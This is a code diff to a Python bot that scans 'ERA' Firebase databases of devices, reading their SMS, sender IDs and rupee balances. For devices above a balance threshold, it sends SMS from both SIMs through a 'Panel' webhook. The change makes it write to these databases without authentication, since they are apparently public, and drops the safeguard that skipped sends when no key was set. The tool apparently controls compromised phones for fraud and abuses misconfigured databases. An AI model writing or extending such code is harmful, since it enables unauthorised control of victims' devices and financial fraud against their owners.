@@ -747,36 +747,56 @@ SMS_CHECK_TIMEOUT = float(os.getenv("SMS_CHECK_TIMEOUT", "25"))
 SMS_CHECK_TO = os.getenv("SMS_CHECK_TO", "").strip()
 
 
+def _firebase_auth_key() -> str:
+    return (
+        store.get("firebase_auth_key")
+        or os.getenv("FIREBASE_AUTH_KEY", "")
+        or os.getenv("FIREBASE_DB_SECRET", "")
+    ).strip()
+
+
 def _firebase_auth_available() -> bool:
-    return bool(
-        (store.get("firebase_auth_key") or os.getenv("FIREBASE_AUTH_KEY", "") or os.getenv("FIREBASE_DB_SECRET", "")).strip()
-    )
+    # ERA Firebases are typically public — always allow SMS-check attempts.
+    # Optional FIREBASE_AUTH_KEY is only used if public write is denied.
+    return True
 
 
 async def firebase_write(path: str, data: Any) -> Any:
-    """Panel-compatible PUT with ?auth= (same as Zp)."""
-    url = public_firebase_url(path, with_auth=True)
+    """
+    Panel-compatible PUT (same as Zp).
+    ERA DBs are public → try write without auth first; retry with secret if needed.
+    """
+    body = json.dumps(data).encode("utf-8")
 
-    def put() -> Any:
-        body = json.dumps(data).encode("utf-8")
+    def put(url: str) -> Any:
         req = urllib.request.Request(
             url,
             data=body,
             method="PUT",
             headers={"Content-Type": "application/json"},
         )
+        with urllib.request.urlopen(req, timeout=15) as response:
+            raw = response.read().decode("utf-8")
+            return json.loads(raw) if raw else None
+
+    def attempt() -> Any:
+        # 1) public write
         try:
-            with urllib.request.urlopen(req, timeout=15) as response:
-                raw = response.read().decode("utf-8")
-                return json.loads(raw) if raw else None
+            return put(public_firebase_url(path, with_auth=False))
+        except urllib.error.HTTPError as exc:
+            if exc.code not in {401, 403}:
+                raise RuntimeError(f"Firebase write HTTP {exc.code}") from exc
+        # 2) optional auth retry
+        if not _firebase_auth_key():
+            raise RuntimeError("PERMISSION_DENIED: public write blocked")
+        try:
+            return put(public_firebase_url(path, with_auth=True))
         except urllib.error.HTTPError as exc:
             if exc.code in {401, 403}:
-                raise RuntimeError(
-                    "PERMISSION_DENIED: cannot write sendSms. Set FIREBASE_AUTH_KEY to Database Secret."
-                ) from exc
+                raise RuntimeError("PERMISSION_DENIED: write blocked even with auth key") from exc
             raise RuntimeError(f"Firebase write HTTP {exc.code}") from exc
 
-    return await asyncio.to_thread(put)
+    return await asyncio.to_thread(attempt)
 
 
 def _normalize_phone(raw: str) -> str:
@@ -885,10 +905,6 @@ async def run_sms_checks_on_records(
     devices: dict[str, Any],
 ) -> None:
     """For eligible online devices, verify SIM1 and SIM2 via Panel sendSms + confirm."""
-    if not _firebase_auth_available():
-        log.warning("FIREBASE_AUTH_KEY not set — SMS check skipped (cannot write webhookEvent)")
-        return
-
     eligible = [
         r for r in records
         if r.online == "online" and r.available_balance >= BALANCE_THRESHOLD
@@ -952,10 +968,8 @@ def format_report(records: list[Record], mode: str = "online_no_match") -> str:
     else:
         shown = rs
 
-    # SMS Check rule: hide device if NEITHER SIM confirmed active
-    # (only applies when auth key is available so checks actually ran)
-    if _firebase_auth_available():
-        shown = [r for r in shown if r.sim1_active or r.sim2_active]
+    # STRICT: hide if neither SIM was confirmed ACTIVE (queue alone is not enough)
+    shown = [r for r in shown if r.sim1_active or r.sim2_active]
 
     s = stats(selected(records))  # original full stats for reference
     source_url = (store.get("firebase_url") or os.getenv("FIREBASE_DATABASE_URL", "")).strip().rstrip("/") or "(not configured)"
@@ -966,11 +980,13 @@ def format_report(records: list[Record], mode: str = "online_no_match") -> str:
         f"With Balance ≥ ₹{int(BALANCE_THRESHOLD)}: <b>{s['with_balance_ge_threshold']}</b>",
         f"Configured sender IDs: {esc(', '.join(sorted(allowed_senders)) or '(none)')}",
         f"Mode: {esc(mode)}",
+        f"SMS check: public Firebase write (ERA)",
         "",
     ]
     if not shown:
         out.append(
-            f"No devices found (filter: ≥ ₹{int(BALANCE_THRESHOLD)}"
+            f"No devices with verified SIM ACTIVE "
+            f"(filter: ≥ ₹{int(BALANCE_THRESHOLD)}"
             + (", Online only" if mode in {"online", "online_no_match"} else "")
             + (", Match NO only" if mode in {"no_match", "online_no_match"} else "")
             + ")."
@@ -1255,19 +1271,22 @@ async def run_scan(message: Any, path: str, mode: str = "online_no_match", with_
 
             records = scan_device_snapshot(snapshot, path or "/", messages_override=messages_map)
 
-            # Automatic SIM SMS check (Panel webhookEvent/sendSms + isSended confirm)
-            if _firebase_auth_available():
-                need_check = sum(
-                    1 for r in records
-                    if r.online == "online" and r.available_balance >= BALANCE_THRESHOLD
+            # Automatic SIM SMS check (Panel webhookEvent/sendSms + isSended/inbox confirm)
+            # ERA Firebase is public — write without secret first
+            need_check = sum(
+                1 for r in records
+                if r.online == "online" and r.available_balance >= BALANCE_THRESHOLD
+            )
+            if need_check:
+                await message.reply_text(
+                    f"SMS check on {need_check} eligible online devices (SIM 1 & SIM 2) …"
                 )
-                if need_check:
-                    await message.reply_text(
-                        f"SMS check on {need_check} eligible online devices (SIM 1 & SIM 2) …"
-                    )
-                    await run_sms_checks_on_records(records, clients, devices)
-            else:
-                log.info("SMS check skipped: set FIREBASE_AUTH_KEY (Database Secret) to enable")
+                await run_sms_checks_on_records(records, clients, devices)
+                ok = sum(1 for r in records if r.sim1_active or r.sim2_active)
+                await message.reply_text(
+                    f"SMS check done. Verified SIM ACTIVE: {ok} device(s). "
+                    f"Unverified hidden."
+                )
 
             store.finish(sid, records, "completed")
             await reply_report(message, format_report(records, mode), with_buttons)
